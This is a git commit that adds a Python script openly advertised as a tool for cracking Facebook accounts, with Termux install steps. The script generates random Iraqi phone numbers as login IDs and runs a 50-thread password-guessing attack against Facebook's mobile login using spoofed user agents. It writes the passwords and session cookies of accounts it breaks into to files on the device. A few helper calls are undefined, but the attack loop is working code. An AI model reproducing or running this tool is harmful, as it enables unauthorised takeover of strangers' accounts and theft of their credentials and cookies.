7c488e62074d97d38731b84c4146a600edaaecdf
Bewa-1-6-6-6 <145509352+Bewa-1-6-6-6@users.noreply.github.com>
2023-10-14 01:44:57 +0300

    b_b1d4m.py
    pkg update
    pkg upgrade
    pkg install git
    pkg install python
    git clone https://github.com/Bewa-1-6-6-6/b1d4mmm.git
    cd b1d4mmm
    python b_b1d4m.py

---
+++ b_b1d4m.py
@@ -0,0 +1,252 @@
+#CodBy b_b1d4m
+#Saga Zool Ba Tamay Edete
+#Gar brdt Nawm Bena b_b1d4m
+import os,sys,time,json,random,re,string,platform,base64,uuid
+
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+
+
+            
+            
+
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+ORANGE = '\033[1;35m'
+GREEN = '\033[1;32m'
+WHITE = '\033[1;97m' #
+BLUE = '\033[1;33m'
+YELLOW = '\033[1;33m'
+RED = '\033[1;91m'
+M = '\x1b[1;97m' # b1d4m
+P = '\x1b[1;91m' # b1d4m
+K = '\x1b[1;92m' # b1d4m
+H = '\x1b[1;93m' # b1d4m
+U = '\x1b[1;94m' # b1d4m
+B = '\x1b[1;95m' # b1d4m
+N = '\x1b[1;96m' # b1d4m
+O = '\x1b[0m'    
+BN = '\x1b[1;90m' 
+A = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+logo =                                          ("""
+\033[1;91m 
+         CodBy>b_b1d4m
+                                    
+                                    
+ Auther   : b_b1d4m
+ Chanal   : https://t.me/OMETEAM00      
+ Toole    : (V1)      
+ Nrxe Tool: NO MONEY 🤑
+ 
+ Baxer Bet Bo Toole b_b1d4m Tebat Ba Hacke Faecbook
+              
+
+\033[1;91m         b_
+\033[1;97m         b1d4m
+\033[1;32m         V
+\033[1;32m         1
+                                        
+""")
+loop = 0
+oks = []
+cps = []
+
+
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mBosta Ta Maweke Kam Bo >UPDATE< \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mBarez To Xatt Nea... \033[0;97m')
+#CodBy<...>b_b1d4m
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+#b_b1d4m_UP
+ugen2=[]
+ugen=[]
+ 
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+#Awa Saga Zool Ba Tamay Edet Kay
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    jalan(logo)
+    
+    
+    jalan("\033[1;37m\t Crack Kurdstan IRAQ Dakat")
+    jalan('\033[1;36m     \t Crack Am Raqamana Dakat\n     \033[1;32m(+964780), \033[1;36m(+964770) ,\033[1;35m(+964751) ,\033[1;34m(+964750)\033[0;97m')
+
+    code = input(' Hal Bzhera : ')
+    os.system("clear")
+    print("Toole b_b1d4m Bo Crack FB")
+    limit = int(input('Chan IDS Dawe Bo Crack NMUNA 1000 :- '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = int(input("[°|°]  Chan Password Dawe Bo Crack  : "))
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input("[°|°]  Password Dane : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        print('\033[1;91m IDS: '+tl)
+        print('\033[1;97m Rawsta Ta Chan Daqek Crack Dakam ....')
+        print('\033[1      (V1) ;CodBy.b_b1d4m')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print('\033[1;34m >_Crack Tawaw Barez_<')
+
+def rcrack(uid,pwx,tl):
+    #Bzhy b_b1d4m
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('    \033[1;32m[OK  b-b1d4m]=  ' +cid+ ' | ' +ps+    '  \n \033[1;97mCookies = \033[1;97m'+coki+  ' \n '+pro+'  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/ok.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                follow(self, session, coki)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('    \33[1;30mCP = ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/cp.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r               %s[%s/%s]  [OK b-b1d4m:%s]  [CP b-b1d4m :%s] \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
+
+i()
